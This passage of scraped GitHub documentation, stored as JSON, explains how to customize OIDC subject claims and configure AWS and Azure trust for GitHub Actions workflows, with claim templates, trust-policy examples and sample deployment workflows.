        "text": "If you do not want to use the defaultaudvalue offered by an action, you can provide a custom value for theaudienceclaim. This allows you to set a condition that only workflows in a specific repository or organization can access the cloud role. If the action you are using supports this, you can use thewithkeyword in your workflow to pass a customaudvalue to the action. For more information, seeMetadata syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Customizing the subject claims for an organization or repository"
      },
      {
        "type": "paragraph",
        "text": "To help improve security, compliance, and standardization, you can customize the standard claims to suit your required access conditions. If your cloud provider supports conditions on subject claims, you can create a condition that checks whether thesubvalue matches the path of the reusable workflow, such as\"job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\". The exact format will vary depending on your cloud provider's OIDC configuration. To configure the matching condition on GitHub, you can use the REST API to require that thesubclaim must always include a specific custom claim, such asjob_workflow_ref. You can use the REST API to apply a customization template for the OIDC subject claim; for example, you can require that thesubclaim within the OIDC token must always include a specific custom claim, such asjob_workflow_ref. For more information, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When the organization template is applied, it will not affect any workflows already using OIDC unless their repository has opted in to custom organization templates. For all repositories, existing and new, the repository owner will need to use the repository-level REST API to opt in to receive this configuration by settinguse_defaulttofalse. Alternatively, the repository owner could use the REST API to apply a different configuration specific to the repository. For more information, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "paragraph",
        "text": "Customizing the claims results in a new format for the entiresubclaim, which replaces the default predefinedsubformat in the token described inAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Thesubclaim uses the shortened formrepo(for example,repo:ORG-NAME/REPO-NAME) instead ofrepositoryto reference the repository.\nAny:within the context value will be replaced with%3A."
      },
      {
        "type": "paragraph",
        "text": "The following example templates demonstrate various ways to customize the subject claim. To configure these settings on GitHub, admins use the REST API to specify a list of claims that must be included in the subject (sub) claim."
      },
      {
        "type": "paragraph",
        "text": "To apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, seeREST API endpoints for GitHub Actions OIDC, and for repositories, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "paragraph",
        "text": "To customize your subject claims, you should first create a matching condition in your cloud provider's OIDC configuration, before customizing the configuration using the REST API. Once the configuration is completed, each time a new job runs, the OIDC token generated during that job will follow the new customization template. If the matching condition doesn't exist in the cloud provider's OIDC configuration before the job runs, the generated token might not be accepted by the cloud provider, since the cloud conditions may not be synchronized."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Allowing repository based on visibility and owner"
      },
      {
        "type": "paragraph",
        "text": "This example template allows thesubclaim to have a new format, usingrepository_ownerandrepository_visibility:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"include_claim_keys\": [\n       \"repository_owner\",\n       \"repository_visibility\"\n   ]\n}"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require that claims must include specific values forrepository_ownerandrepository_visibility. For example:\"sub\": \"repository_owner:monalisa:repository_visibility:private\". The approach lets you restrict cloud role access to only private repositories within an organization or enterprise."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Allowing access to all repositories with a specific owner"
      },
      {
        "type": "paragraph",
        "text": "This example template enables thesubclaim to have a new format with only the value ofrepository_owner."
      },
      {
        "type": "paragraph",
        "text": "To apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, seeREST API endpoints for GitHub Actions OIDC, and for repositories, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"include_claim_keys\": [\n       \"repository_owner\"\n   ]\n}"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require that claims must include a specific value forrepository_owner. For example:\"sub\": \"repository_owner:monalisa\""
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Requiring a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "This example template allows thesubclaim to have a new format that contains the value of thejob_workflow_refclaim. This enables an enterprise to usereusable workflowsto enforce consistent deployments across its organizations and repositories."
      },
      {
        "type": "paragraph",
        "text": "To apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, seeREST API endpoints for GitHub Actions OIDC, and for repositories, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n     \"include_claim_keys\": [\n         \"job_workflow_ref\"\n     ]\n  }"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require that claims must include a specific value forjob_workflow_ref. For example:\"sub\": \"job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\"."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Requiring a reusable workflow and other claims"
      },
      {
        "type": "paragraph",
        "text": "The following example template combines the requirement of a specific reusable workflow with additional claims."
      },
      {
        "type": "paragraph",
        "text": "To apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, seeREST API endpoints for GitHub Actions OIDC, and for repositories, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "paragraph",
        "text": "This example also demonstrates how to use\"context\"to define your conditions. This is the part that follows the repository in thedefaultsubformat. For example, when the job references an environment, the context contains:environment:ENVIRONMENT-NAME."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"include_claim_keys\": [\n       \"repo\",\n       \"context\",\n       \"job_workflow_ref\"\n   ]\n}"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require that claims must include specific values forrepo,context, andjob_workflow_ref."
      },
      {
        "type": "paragraph",
        "text": "This customization template requires that thesubuses the following format:repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME:job_workflow_ref:REUSABLE-WORKFLOW-PATH.\nFor example:\"sub\": \"repo:octo-org/octo-repo:environment:prod:job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\""
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Granting access to a specific repository"
      },
      {
        "type": "paragraph",
        "text": "This example template lets you grant cloud access to all the workflows in a specific repository, across all branches/tags and environments."
      },
      {
        "type": "paragraph",
        "text": "To apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, seeREST API endpoints for GitHub Actions OIDC, and for repositories, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"include_claim_keys\": [\n       \"repo\"\n   ]\n}"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require arepoclaim that matches the required value."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Using system-generated GUIDs"
      },
      {
        "type": "paragraph",
        "text": "This example template enables predictable OIDC claims with system-generated GUIDs that do not change between renames of entities (such as renaming a repository)."
      },
      {
        "type": "paragraph",
        "text": "To apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, seeREST API endpoints for GitHub Actions OIDC, and for repositories, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n     \"include_claim_keys\": [\n         \"repository_id\"\n     ]\n  }"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require arepository_idclaim that matches the required value."
      },
      {
        "type": "paragraph",
        "text": "or:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"include_claim_keys\": [\n       \"repository_owner_id\"\n   ]\n}"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require arepository_owner_idclaim that matches the required value."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Context value with:"
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how to handle context value with:. For example, when the job references an environment namedproduction:eastus."
      },
      {
        "type": "paragraph",
        "text": "To apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, seeREST API endpoints for GitHub Actions OIDC, and for repositories, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"include_claim_keys\": [\n       \"environment\",\n       \"repository_owner\"\n   ]\n}"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require that claims must include a specific value forenvironmentandrepository_owner. For example:\"sub\": \"environment:production%3Aeastus:repository_owner:octo-org\"."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Resetting organization template customizations"
      },
      {
        "type": "paragraph",
        "text": "This example template resets the subject claims to the default format. This template effectively opts out of any organization-level customization policy."
      },
      {
        "type": "paragraph",
        "text": "To apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, seeREST API endpoints for GitHub Actions OIDC, and for repositories, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"include_claim_keys\": [\n       \"repo\",\n       \"context\"\n   ]\n}"
      },
      {
        "type": "paragraph",
        "text": "In your cloud provider's OIDC configuration, configure thesubcondition to require that claims must include specific values forrepoandcontext."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Resetting repository template customizations"
      },
      {
        "type": "paragraph",
        "text": "All repositories in an organization have the ability to opt in or opt out of (organization and repository-level) customizedsubclaim templates."
      },
      {
        "type": "paragraph",
        "text": "To opt out a repository and reset back to the defaultsubclaim format, a repository administrator must use the REST API endpoint atREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "paragraph",
        "text": "To configure repositories to use the defaultsubclaim format, use thePUT /repos/{owner}/{repo}/actions/oidc/customization/subREST API endpoint at with the following request body."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"use_default\": true\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Configuring a repository to use an organization template"
      },
      {
        "type": "paragraph",
        "text": "Once an organization has created a customizedsubclaim template, the REST API can be used to programmatically apply the template to repositories within the organization. A repository administrator can configure their repository to use the template created by the administrator of their organization."
      },
      {
        "type": "paragraph",
        "text": "To configure the repository to use the organization's template, a repository admin must use thePUT /repos/{owner}/{repo}/actions/oidc/customization/subREST API endpoint at with the following request body. For more information, seeREST API endpoints for GitHub Actions OIDC."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n   \"use_default\": false\n}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your workflows for OIDC"
      },
      {
        "type": "paragraph",
        "text": "You can now update your YAML workflows to use OIDC access tokens instead of secrets. Popular cloud providers have published their official login actions that make it easy for you to get started with OIDC. For more information about updating your workflows, see the cloud-specific guides listed below inEnabling OpenID Connect for your cloud provider."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Enabling OpenID Connect for Python package publishing"
      },
      {
        "type": "paragraph",
        "text": "You can use a GitHub Actions workflow in a repository as a trusted publisher for a PyPI project. Using a workflow as a trusted publisher allows OIDC access tokens to be exchanged for temporary PyPI API tokens. For more information, seeConfiguring OpenID Connect in PyPIandPublishing to PyPI with a Trusted Publisherin the PyPI documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Enabling OpenID Connect for your cloud provider"
      },
      {
        "type": "paragraph",
        "text": "To enable and configure OIDC for your specific cloud provider, see the following guides:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Configuring OpenID Connect in Amazon Web Services",
          "Configuring OpenID Connect in Azure",
          "Configuring OpenID Connect in Google Cloud Platform",
          "Configuring OpenID Connect in HashiCorp Vault"
        ]
      },
      {
        "type": "paragraph",
        "text": "To enable and configure OIDC for another cloud provider, see the following guide:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Configuring OpenID Connect in cloud providers"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Debugging your OIDC claims"
      },
      {
        "type": "paragraph",
        "text": "You can use thegithub/actions-oidc-debuggeraction to visualize the claims that would be sent, before integrating with a cloud provider. This action requests a JWT and prints the claims included within the JWT that were received from GitHub Actions."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "OpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Amazon Web Services (AWS), without needing to store the AWS credentials as long-lived GitHub secrets."
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to configure AWS to trust GitHub's OIDC as a federated identity, and includes a workflow example for theaws-actions/configure-aws-credentialsthat uses tokens to authenticate to AWS and access resources."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Support for custom claims for OIDC is unavailable in AWS."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, seeAbout security hardening with OpenID Connect.",
          "Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, youmustdefine at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding the identity provider to AWS"
      },
      {
        "type": "paragraph",
        "text": "To add the GitHub OIDC provider to IAM, see theAWS documentation."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the provider URL: Usehttps://token.actions.githubusercontent.com",
          "For the \"Audience\": Usests.amazonaws.comif you are using theofficial action."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the role and trust policy"
      },
      {
        "type": "paragraph",
        "text": "To configure the role and trust in IAM, see the AWS documentationConfigure AWS Credentials for GitHub ActionsandConfiguring a role for GitHub OIDC identity provider."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "AWS Identity and Access Management (IAM) recommends that users evaluate the IAM condition key,token.actions.githubusercontent.com:sub, in the trust policy of any role that trusts GitHub’s OIDC identity provider (IdP). Evaluating this condition key in the role trust policy limits which GitHub actions are able to assume the role."
      },
      {
        "type": "paragraph",
        "text": "Edit the trust policy, adding thesubfield to the validation conditions. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "\"Condition\": {\n  \"StringEquals\": {\n    \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\",\n    \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:ref:refs/heads/octo-branch\"\n  }\n}"
      },
      {
        "type": "paragraph",
        "text": "If you use a workflow with an environment, thesubfield must reference the environment name:repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME. For more information, seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, seeManaging environments for deployment."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "\"Condition\": {\n  \"StringEquals\": {\n    \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\",\n    \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:environment:prod\"\n  }\n}"
      },
      {
        "type": "paragraph",
        "text": "In the following example,StringLikeis used with a wildcard operator (*) to allow any branch, pull request merge branch, or environment from theocto-org/octo-repoorganization and repository to assume a role in AWS."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\": \"arn:aws:iam::123456123456:oidc-provider/token.actions.githubusercontent.com\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Condition\": {\n                \"StringLike\": {\n                    \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:*\"\n                },\n                \"StringEquals\": {\n                    \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\"\n                }\n            }\n        }\n    ]\n}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your GitHub Actions workflow"
      },
      {
        "type": "paragraph",
        "text": "To update your workflows for OIDC, you will need to make two changes to your YAML:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Add permissions settings for the token.",
          "Use theaws-actions/configure-aws-credentialsaction to exchange the OIDC token (JWT) for a cloud access token."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding permissions settings"
      },
      {
        "type": "paragraph",
        "text": "The job or workflow run requires apermissionssetting withid-token: writeto allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if thepermissionsforid-tokenis not set towrite, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Theid-token: writesetting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URLandACTIONS_ID_TOKEN_REQUEST_TOKEN).",
          "UsinggetIDToken()from the Actions toolkit."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout"
      },
      {
        "type": "paragraph",
        "text": "If you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT"
      },
      {
        "type": "paragraph",
        "text": "You may need to specify additional permissions here, depending on your workflow's requirements."
      },
      {
        "type": "paragraph",
        "text": "For reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context.\nFor reusable workflows outside your enterprise or organization, thepermissionssetting forid-tokenshould be explicitly set towriteat the caller workflow level or in the specific job that calls the reusable workflow.\nThis ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Requesting the access token"
      },
      {
        "type": "paragraph",
        "text": "Theaws-actions/configure-aws-credentialsaction receives a JWT from the GitHub OIDC provider, and then requests an access token from AWS. For more information, see the AWSdocumentation."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "BUCKET-NAME: Replace this with the name of your S3 bucket.",
          "AWS-REGION: Replace this with the name of your AWS region.",
          "ROLE-TO-ASSUME: Replace this with your AWS role. For example,arn:aws:iam::1234567890:role/example-role"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# Sample workflow to access AWS resources when workflow is tied to branch\n# The workflow Creates static website using aws s3\nname: AWS example workflow\non:\n  push\nenv:\n  BUCKET_NAME : \"BUCKET-NAME\"\n  AWS_REGION : \"AWS-REGION\"\n# permission can be added at job level or workflow level\npermissions:\n  id-token: write   # This is required for requesting the JWT\n  contents: read    # This is required for actions/checkout\njobs:\n  S3PackageUpload:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Git clone the repository\n        uses: actions/checkout@v4\n      - name: configure aws credentials\n        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502\n        with:\n          role-to-assume: ROLE-TO-ASSUME\n          role-session-name: samplerolesession\n          aws-region: ${{ env.AWS_REGION }}\n      # Upload a file to AWS s3\n      - name: Copy index.html to s3\n        run: |\n          aws s3 cp ./index.html s3://${{ env.BUCKET_NAME }}/"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using OpenID Connect with reusable workflows",
          "Communicating with self-hosted runners"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-azure",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "OpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Azure, without needing to store the Azure credentials as long-lived GitHub secrets."
      },
      {
        "type": "paragraph",
        "text": "This guide gives an overview of how to configure Azure to trust GitHub's OIDC as a federated identity, and includes a workflow example for theazure/loginaction that uses tokens to authenticate to Azure and access resources."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, seeAbout security hardening with OpenID Connect.",
          "Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, youmustdefine at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding the federated credentials to Azure"
      },
      {
        "type": "paragraph",
        "text": "GitHub's OIDC provider works with Azure's workload identity federation. For an overview, see Microsoft's documentation atWorkload identity federation."
      },
      {
        "type": "paragraph",
        "text": "To configure the OIDC identity provider in Azure, you will need to perform the following configuration. For instructions on making these changes, refer tothe Azure documentation."
      },
      {
        "type": "paragraph",
        "text": "In the following procedure, you will create an application for Microsoft Entra ID (previously known as Azure AD)."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Entra ID application and a service principal.",
          "Add federated credentials for the Entra ID application.",
          "Create GitHub secrets for storing Azure configuration."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additional guidance for configuring the identity provider:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For security hardening, make sure you've reviewedAbout security hardening with OpenID Connect. For an example, seeAbout security hardening with OpenID Connect.",
          "For theaudiencesetting,api://AzureADTokenExchangeis the recommended value, but you can also specify other values here."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your GitHub Actions workflow"
      },
      {
        "type": "paragraph",
        "text": "To update your workflows for OIDC, you will need to make two changes to your YAML:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Add permissions settings for the token.",
          "Use theazure/loginaction to exchange the OIDC token (JWT) for a cloud access token."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, seeManaging environments for deployment."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding permissions settings"
      },
      {
        "type": "paragraph",
        "text": "The job or workflow run requires apermissionssetting withid-token: writeto allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if thepermissionsforid-tokenis not set towrite, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Theid-token: writesetting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URLandACTIONS_ID_TOKEN_REQUEST_TOKEN).",
          "UsinggetIDToken()from the Actions toolkit."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout"
      },
      {
        "type": "paragraph",
        "text": "If you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT"
      },
      {
        "type": "paragraph",
        "text": "You may need to specify additional permissions here, depending on your workflow's requirements."
      },
      {
        "type": "paragraph",
        "text": "For reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context.\nFor reusable workflows outside your enterprise or organization, thepermissionssetting forid-tokenshould be explicitly set towriteat the caller workflow level or in the specific job that calls the reusable workflow.\nThis ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Requesting the access token"
      },
      {
        "type": "paragraph",
        "text": "Theazure/loginaction receives a JWT from the GitHub OIDC provider, and then requests an access token from Azure. For more information, see theazure/logindocumentation."
      },
      {
        "type": "paragraph",
        "text": "The following example exchanges an OIDC ID token with Azure to receive an access token, which can then be used to access cloud resources."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Run Azure Login with OIDC\non: [push]\n\npermissions:\n  id-token: write\n  contents: read\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Az CLI login'\n        uses: azure/login@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n\n      - name: 'Run az commands'\n        run: |\n          az account show\n          az group list"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using OpenID Connect with reusable workflows",
          "Communicating with self-hosted runners"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "OpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in your cloud provider, without having to store any credentials as long-lived GitHub secrets."
      },
      {
        "type": "paragraph",
        "text": "To use OIDC, you will first need to configure your cloud provider to trust GitHub's OIDC as a federated identity, and must then update your workflows to authenticate using tokens."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, seeAbout security hardening with OpenID Connect.",
          "Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, youmustdefine at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your GitHub Actions workflow"
      },
      {
        "type": "paragraph",
        "text": "To update your workflows for OIDC, you will need to make two changes to your YAML:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Add permissions settings for the token.",
          "Use the official action from your cloud provider to exchange the OIDC token (JWT) for a cloud access token."
        ]
      },
      {
        "type": "paragraph",
        "text": "If your cloud provider doesn't yet offer an official action, you can update your workflows to perform these steps manually."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, seeManaging environments for deployment."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding permissions settings"
      },
      {
        "type": "paragraph",
        "text": "The job or workflow run requires apermissionssetting withid-token: writeto allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if thepermissionsforid-tokenis not set towrite, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Theid-token: writesetting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URLandACTIONS_ID_TOKEN_REQUEST_TOKEN).",
          "UsinggetIDToken()from the Actions toolkit."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout"
      },
      {
        "type": "paragraph",
        "text": "If you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT"
      },
      {
        "type": "paragraph",
        "text": "You may need to specify additional permissions here, depending on your workflow's requirements."
      },
      {
        "type": "paragraph",
        "text": "For reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context.\nFor reusable workflows outside your enterprise or organization, thepermissionssetting forid-tokenshould be explicitly set towriteat the caller workflow level or in the specific job that calls the reusable workflow.\nThis ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 3,
